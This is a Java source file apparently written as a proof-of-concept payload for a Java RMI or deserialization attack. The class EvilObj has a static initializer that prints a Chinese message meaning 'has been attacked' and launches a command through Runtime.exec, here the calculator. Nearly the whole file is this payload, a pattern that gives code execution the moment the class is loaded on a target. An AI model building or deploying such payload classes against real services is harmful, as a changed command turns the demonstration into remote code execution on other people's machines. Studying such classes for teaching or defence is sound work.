package com.fdx.rmi;

import java.io.IOException;

public class EvilObj {
    static {
        System.out.println("已被攻击");
        try {
            Runtime.getRuntime().exec("calc");
        } catch (IOException e) {
            e.printStackTrace();
        }
    }
}
